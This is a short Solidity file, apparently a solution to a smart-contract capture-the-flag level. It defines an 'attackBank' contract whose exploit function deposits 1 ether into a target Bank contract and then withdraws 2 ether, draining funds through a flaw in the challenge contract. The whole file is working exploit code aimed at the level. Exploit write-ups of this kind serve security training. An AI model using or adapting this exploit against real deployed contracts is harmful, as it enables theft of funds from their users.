// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/Bank.sol";

contract attackBank {
	Bank originalContract;

	constructor(address _originalContract) public {
		originalContract = Bank(_originalContract);
	}

	function exploit() public payable {
		require(msg.value == 1 ether);
		address(originalContract).call.value(1 ether)(abi.encodeWithSignature("deposit()"));
		originalContract.withdraw(2 ether);
	}

}